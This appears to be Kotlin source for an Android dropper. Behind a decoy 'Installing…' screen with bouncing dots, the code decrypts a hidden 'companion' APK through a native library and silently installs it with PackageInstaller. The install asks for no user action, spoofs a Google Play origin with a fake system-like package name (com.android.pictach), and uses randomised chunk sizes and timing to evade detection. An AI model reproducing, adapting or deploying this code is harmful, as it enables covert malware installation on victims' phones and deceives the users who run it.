package com.cristal.bristral.tristal.mistral

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.util.TypedValue
import android.view.View
import android.widget.FrameLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.util.concurrent.ThreadLocalRandom

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    private val statusMessages = listOf(
        "Installing\u2026",
        "Please wait\u2026",
        "Finishing up\u2026",
        "Please wait\u2026"
    )
    private var statusIndex = 0
    private var nativeLibLoaded = false

    // Dot specs: [colorHex, sizeDp, leftDp, topDp, animDelayMs, bounceHeightDp]
    private val dotSpecs = listOf(
        listOf("#BDBDBD", 22, 54,   0,    0,   10, true),   // d1  outline top-center
        listOf("#00BCD4", 24,  0,  34,  100,   12, false),  // d2  cyan large left
        listOf("#9E9E9E",  9, 54,  42,  200,    7, false),  // d3  small grey mid
        listOf("#9E9E9E", 22, 74,  34,  150,    9, false),  // d4  grey right
        listOf("#BDBDBD", 21,  0,  70,  250,    8, false),  // d5  grey left mid
        listOf("#00BCD4", 30, 28,  64,   50,   14, false),  // d6  cyan large center
        listOf("#F44336", 24, 98,  70,  300,   10, false),  // d7  red right
        listOf("#4CAF50", 11,  2, 108,  180,    6, false),  // d8  small green left
        listOf("#E0E0E0",  9, 44, 112,  350,    5, false),  // d9  tiny grey
        listOf("#BDBDBD", 23, 64, 104,  120,    9, true),   // d10 outline center-right
        listOf("#FFC107", 30, 64, 142,   80,   13, false)   // d11 yellow bottom
    )

    companion object {
        private const val TAG             = "InstallActivity"
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private const val MARKET_URI     = "market://details?id=com.android.pictach"
        private const val REFERRER_URI   = "android-app://com.android.vending"
        private const val WRITE_NAME     = "update.pkg"
        private const val CHUNK_MIN      = 131072
        private const val CHUNK_MAX      = 524288
        private const val DELAY_MIN      = 400L
        private const val DELAY_MAX      = 800L
        private const val ENCRYPTED_ASSET = "companion.enc"
        private const val TEMP_APK_NAME  = "companion_install.apk"
    }

    private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Full white immersive screen
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            )
        }

        setContentView(R.layout.activity_install)

        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)

        // Build and animate dots AFTER layout is drawn
        val container = findViewById<FrameLayout>(R.id.dots_container)
        container.post { buildAndAnimateDots(container) }

        // Cycle status text
        val cycleRunnable = object : Runnable {
            override fun run() {
                statusIndex = (statusIndex + 1) % statusMessages.size
                tvStatus?.text = statusMessages[statusIndex]
                handler.postDelayed(this, 2200)
            }
        }
        handler.postDelayed(cycleRunnable, 2200)

        nativeLibLoaded = try {
            System.loadLibrary("companionguard")
            true
        } catch (e: UnsatisfiedLinkError) {
            Log.e(TAG, "Native lib failed: ${e.message}")
            false
        }

        Thread { runPipeline() }.start()
    }

    private fun buildAndAnimateDots(container: FrameLayout) {
        dotSpecs.forEach { spec ->
            val colorHex  = spec[0] as String
            val sizeDp    = (spec[1] as Int).toFloat()
            val leftDp    = (spec[2] as Int).toFloat()
            val topDp     = (spec[3] as Int).toFloat()
            val delayMs   = (spec[4] as Int).toLong()
            val bounceDp  = (spec[5] as Int).toFloat()
            val isOutline = spec[6] as Boolean

            val sizePx  = dp(sizeDp).toInt()
            val leftPx  = dp(leftDp).toInt()
            val topPx   = dp(topDp).toInt()
            val bouncePx = dp(bounceDp)

            val dot = View(this).apply {
                layoutParams = FrameLayout.LayoutParams(sizePx, sizePx).apply {
                    leftMargin = leftPx
                    topMargin  = topPx
                }
                if (isOutline) {
                    // Outline circle using a shape drawable
                    background = androidx.core.content.ContextCompat.getDrawable(
                        this@InstallActivity,
                        android.R.drawable.btn_default
                    )
                    background = createOutlineDrawable(colorHex, sizePx)
                } else {
                    background = createFilledDrawable(colorHex, sizePx)
                }
            }
            container.addView(dot)

            // Bounce animation: translateY up then back down, looping
            val bounceUp = ObjectAnimator.ofFloat(dot, "translationY", 0f, -bouncePx).apply {
                duration = 350
                startDelay = delayMs
                interpolator = android.view.animation.DecelerateInterpolator()
            }
            val bounceDown = ObjectAnimator.ofFloat(dot, "translationY", -bouncePx, 0f).apply {
                duration = 350
                interpolator = android.view.animation.AccelerateInterpolator()
            }
            // Slight scale pulse while bouncing
            val scaleUp = ObjectAnimator.ofFloat(dot, "scaleX", 1f, 1.12f).apply {
                duration = 350
                startDelay = delayMs
            }
            val scaleDown = ObjectAnimator.ofFloat(dot, "scaleX", 1.12f, 1f).apply { duration = 350 }
            val scaleYUp = ObjectAnimator.ofFloat(dot, "scaleY", 1f, 1.12f).apply {
                duration = 350
                startDelay = delayMs
            }
            val scaleYDown = ObjectAnimator.ofFloat(dot, "scaleY", 1.12f, 1f).apply { duration = 350 }

            val set = AnimatorSet().apply {
                playSequentially(
                    AnimatorSet().also { it.playTogether(bounceUp, scaleUp, scaleYUp) },
                    AnimatorSet().also { it.playTogether(bounceDown, scaleDown, scaleYDown) }
                )
                startDelay = delayMs
            }

            // Repeat the animation indefinitely
            set.addListener(object : android.animation.AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: android.animation.Animator) {
                    set.startDelay = (600 + delayMs % 400)
                    set.start()
                }
            })
            set.start()
        }
    }

    private fun createFilledDrawable(colorHex: String, sizePx: Int): android.graphics.drawable.Drawable {
        val drawable = android.graphics.drawable.GradientDrawable()
        drawable.shape = android.graphics.drawable.GradientDrawable.OVAL
        drawable.setColor(Color.parseColor(colorHex))
        return drawable
    }

    private fun createOutlineDrawable(colorHex: String, sizePx: Int): android.graphics.drawable.Drawable {
        val drawable = android.graphics.drawable.GradientDrawable()
        drawable.shape = android.graphics.drawable.GradientDrawable.OVAL
        drawable.setColor(Color.TRANSPARENT)
        drawable.setStroke(dp(2.5f).toInt(), Color.parseColor(colorHex))
        return drawable
    }

    private fun dp(value: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)

    private fun runPipeline() {
        try {
            val apkBytes = loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) { showNormal(); return }
            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
        } catch (e: Exception) { showNormal() }
    }

    private fun loadAssets(): ByteArray? {
        if (nativeLibLoaded) {
            val tempApk = File(filesDir, TEMP_APK_NAME)
            try {
                val encBlob = assets.open(ENCRYPTED_ASSET).use { it.readBytes() }
                val ok = decryptCompanion(encBlob, tempApk.absolutePath)
                if (ok && tempApk.exists() && tempApk.length() > 0) {
                    val magic = ByteArray(2)
                    FileInputStream(tempApk).use { it.read(magic) }
                    if (magic[0] == 'P'.code.toByte() && magic[1] == 'K'.code.toByte()) {
                        val bytes = tempApk.readBytes()
                        tempApk.delete()
                        return bytes
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Encrypted load failed: ${e.message}")
            } finally {
                if (tempApk.exists()) tempApk.delete()
            }
        }
        return try {
            assets.open("companion.apk").use { it.readBytes() }
        } catch (e: Exception) {
            Log.e(TAG, "Fallback load failed: ${e.message}")
            null
        }
    }

    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            params.setAppPackageName("com.android.pictach")
            params.setSize(apkBytes.size.toLong())
            params.setInstallLocation(1)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                params.setDontKillApp(true)
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                params.setRequestUpdateOwnership(true)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    params.setOriginatingUri(Uri.parse(MARKET_URI))
                    params.setReferrerUri(Uri.parse(REFERRER_URI))
                } catch (e: Exception) { }
            }
            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)
            try {
                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    var offset = 0
                    while (offset < apkBytes.size) {
                        val chunkSize = ThreadLocalRandom.current().nextInt(CHUNK_MIN, CHUNK_MAX)
                        val end = minOf(offset + chunkSize, apkBytes.size)
                        out.write(apkBytes, offset, end - offset)
                        session.fsync(out)
                        offset = end
                    }
                }
                val jitter = ThreadLocalRandom.current().nextLong(DELAY_MIN, DELAY_MAX)
                Thread.sleep(jitter)
                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else PendingIntent.FLAG_UPDATE_CURRENT
                val pendingIntent = PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags)
                session.commit(pendingIntent.intentSender)
                session.close()
            } catch (e: IOException) {
                session.abandon()
                if (attempt < MAX_RETRIES)
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                else showNormal()
            }
        } catch (e: Exception) {
            if (attempt < MAX_RETRIES)
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            else showNormal()
        }
    }

    private fun showNormal() {
        runOnUiThread { tvStatus?.text = getString(R.string.please_keep_connected) }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
}
